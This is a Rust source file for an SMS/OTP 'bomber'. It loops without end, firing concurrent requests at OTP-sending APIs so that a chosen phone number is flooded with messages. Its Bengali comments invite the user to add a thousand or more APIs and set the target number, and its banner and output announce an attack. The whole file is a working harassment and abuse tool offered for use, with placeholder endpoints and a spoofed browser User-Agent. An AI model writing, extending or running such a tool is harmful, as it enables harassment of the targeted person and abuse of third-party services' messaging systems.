use reqwest::{Client, header::{HeaderMap, HeaderValue, CONTENT_TYPE, USER_AGENT}};
use std::time::Duration;
use tokio::time::sleep;
use futures::future::join_all;

// ==========================================
// 🛠️ API CONFIGURATION SECTION
// এখানে আপনি ১০০০+ API যোগ করতে পারবেন
// ==========================================
struct TargetApi {
    url: &'static str,
    method: &'static str,
    payload: &'static str, // {target} placeholder for phone number
}

const APIS: &[TargetApi] = &[
    TargetApi {
        url: "https://api1.example.com/send-otp",
        method: "POST",
        payload: r#"{"phone": "{target}", "type": "login"}"#,
    },
    TargetApi {
        url: "https://api2.example.com/v1/auth",
        method: "POST",
        payload: r#"{"mobile": "{target}"}"#,
    },
    // এভাবেই আপনি ১০০০টি API নিচে নিচে বসাতে পারেন...
];

async fn send_bomb(client: Client, api: &TargetApi, target: &str) {
    let mut headers = HeaderMap::new();
    
    // 🛡️ CUSTOM HEADERS SECTION
    // এখানে আপনার প্রয়োজনীয় Headers বসান
    headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"));
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
    headers.insert("X-Requested-With", HeaderValue::from_static("XMLHttpRequest"));

    let body = api.payload.replace("{target}", target);

    let request = match api.method {
        "POST" => client.post(api.url).headers(headers).body(body),
        _ => client.get(api.url).headers(headers),
    };

    match request.send().await {
        Ok(resp) => {
            if resp.status().is_success() {
                println!("\x1b[32m[+] SUCCESS \x1b[0m-> API: {}", api.url);
            } else {
                println!("\x1b[33m[!] FAILED  \x1b[0m-> Status: {}", resp.status());
            }
        }
        Err(_) => println!("\x1b[31m[-] ERROR   \x1b[0m-> Connection Timed Out"),
    }
}

#[tokio::main]
async fn main() {
    println!(r#"
    █▀█ █░█ █▀ ▀█▀   █▄▄ █▀█ █▀▄▀█ █▄▄ █▀▀ █▀█
    █▀▄ █▄█ ▄█ ░█░   █▄█ █▄█ █░▀░█ █▄█ ██▄ █▀▄
    ------------------------------------------
    [ SYSTEM: ONLINE | MODE: ULTRA-FAST ]
    "#);

    let target_phone = "017XXXXXXXX"; // আপনার টার্গেট নম্বর
    let threads = 50; // একসাথে কয়টি API কল হবে (Concurrency)
    
    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .unwrap();

    println!("\x1b[35m[*] Targeting: {}\x1b[0m", target_phone);
    println!("\x1b[34m[*] Launching Asynchronous Attack...\x1b[0m\n");

    loop {
        let mut tasks = Vec::new();
        for api in APIS {
            let task = send_bomb(client.clone(), api, target_phone);
            tasks.push(task);

            if tasks.len() >= threads {
                join_all(tasks.drain(..)).await;
            }
        }
        join_all(tasks).await;
        sleep(Duration::from_millis(100)).await; // থ্রোটলিং রোধে সামান্য বিরতি
    }
          }
